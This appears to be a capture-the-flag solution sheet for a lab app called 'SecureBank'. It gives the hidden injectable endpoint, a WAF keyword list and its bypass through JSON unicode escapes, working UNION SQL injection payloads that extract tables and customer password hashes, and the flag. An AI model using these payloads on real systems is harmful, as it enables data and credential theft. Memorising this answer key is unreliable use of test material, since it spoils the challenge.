## SecureBank — `/bank` — VERY HARD — MSSQL (SQL Server 2022)

No login anywhere. The site is public (rates, branches, ATM finder, currency converter, about).

**Where:** hidden endpoint `POST /bank/api/statement` (JSON body), field **`to`**. It is not linked anywhere. The value is concatenated inside a quoted date literal at the end of the WHERE clause, just before `ORDER BY 1`.

**Discovery (ffuf)**
- Directory fuzz `/bank/FUZZ` with `dirb/common.txt` finds `api`. Fuzz `/bank/api/FUZZ`: `statement` answers **405** to GET (not 404), `status`, `history` answer 200/400.
- `ffuf -X POST -H 'Content-Type: application/json' -d '{"a":1}' -u http://HOST:5050/bank/api/statement` → `{"error":"invalid request"}`. Fuzz JSON keys with `burp-parameter-names.txt`: `account` changes the error (to "invalid account" / success when numeric). Use `account: 1`.
- With a valid account, fuzz further keys: `from`, `to`, `type`, `q` each change the response (invalid date / invalid type).

**Why it is hard**
- `from` is full-match validated; `to` is validated with a *prefix-only* date regex, so `to` must start with `YYYY-MM-DD` (a bare `'` gives "invalid date").
- A WAF on the **raw** request text blocks `union`, `select`, `--`, `/*`, `;`, `exec`, `xp_`, `sp_`, `insert`, `update`, `delete`, `drop`, `waitfor`, `declare`.
- DB errors are generic ("unable to retrieve statement") so error-based is not possible; the route is UNION.
- `q` (quote doubling), `type` (allow-list), `account` (int + existence check) are safe.

**Discovery of the injection:** `"to":"2024-12-31'"` → HTTP 500 (not 400) = value reaches SQL.

**WAF bypass:** the WAF scans the raw body but SQL sees the JSON-decoded value. Write blocked words as JSON unicode escapes, e.g. `UNION SELECT` (or escape every character). `--` can be `--`, or avoid comments by balancing quotes with `... WHERE '1'='1`.

**Columns / types:** the first query returns 4 columns `(date varchar, description nvarchar, amount decimal, ref varchar)`. Use `NULL` for 1, 3, 4; put text in column 2 (column 3 is numeric).

**Payloads** (`to` value, keywords escaped as above in the real request; `account` = 1):
```
version : 2024-12-31' UNION SELECT NULL,@@version,NULL,NULL WHERE '1'='1
tables  : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables),NULL,NULL WHERE '1'='1
columns : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='internal_notes'),NULL,NULL WHERE '1'='1
data    : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(note_key+'='+note_value,' | ') FROM internal_notes),NULL,NULL WHERE '1'='1
users   : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(username+':'+password_hash,' | ') FROM customers),NULL,NULL WHERE '1'='1
```
Real flag: `FLAG{securebank_unicode_escapes_slip_past_the_gate}` (row `core_banking_secret`; `decoy_token` is fake).

**Rabbit holes (visible, safe):** `/bank/rates?type=`, `/bank/branches?city=`, `/bank/branch?id=`, `/bank/atm?zip=` (any `'` gives a fake 500), `/bank/exchange?from=&to=&amount=` (allow-list). **Hidden but safe:** `/bank/api/history?account=` (int), `/bank/api/status`. **Dead ends:** `/bank/admin`, `/bank/backup`, `/bank/backup.zip`, `/bank/login` (static 403), `robots.txt` entries. Decoy tables `staff_users`, `audit_trail`; decoy row `decoy_token`.
